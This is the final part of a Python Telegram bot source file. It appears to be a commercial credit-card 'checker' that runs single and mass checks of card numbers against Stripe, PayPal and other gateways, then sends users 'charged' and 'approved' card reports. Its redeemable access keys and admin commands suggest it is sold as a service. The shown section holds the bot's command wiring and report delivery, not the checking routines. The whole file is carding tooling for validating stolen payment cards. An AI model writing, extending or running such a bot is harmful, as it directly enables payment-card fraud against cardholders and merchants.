        f.write("\n".join(approved_cards_list) + "\n")

    await progress_msg.edit_text(f"✅ <b>Mass Check Complete!</b>\n• Total Checked: {total}\n• Charged: {charged} | Approved: {approved}", parse_mode="HTML")

    with open(ch_filename, "rb") as f:
        await context.bot.send_document(chat_id=user_id, document=InputFile(f, filename="charged.txt"), caption="🔥 Charged Cards Report")
    with open(ap_filename, "rb") as f:
        await context.bot.send_document(chat_id=user_id, document=InputFile(f, filename="approved.txt"), caption="✅ Approved Cards Report")

    for fname in (ch_filename, ap_filename):
        try:
            os.remove(fname)
        except Exception:
            pass

def main():
    init_db()
    if not TG_TOKEN or TG_TOKEN.startswith("8218903349:X"):
        print("[-] Error: Telegram Token missing.")
        return

    app = Application.builder().token(TG_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("setadmin", cmd_setadmin))
    app.add_handler(CommandHandler("genkeys", cmd_genkeys))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("sh", cmd_single_check))
    app.add_handler(CommandHandler("msh", cmd_mass_check))
    app.add_handler(CommandHandler("pp", cmd_single_check))
    app.add_handler(CommandHandler("mpp", cmd_mass_check))
    app.add_handler(CommandHandler("gate", cmd_gate))
    app.add_handler(CommandHandler("mgate", cmd_mgate))
    app.add_handler(CallbackQueryHandler(handle_callbacks))

    print("[+] 👑PORIOT_KE👑 Dual-Engine Bot (v15 - Stripe, PayPal & Gateway Filter) ONLINE...")
    app.run_polling()

if __name__ == "__main__":
    main()
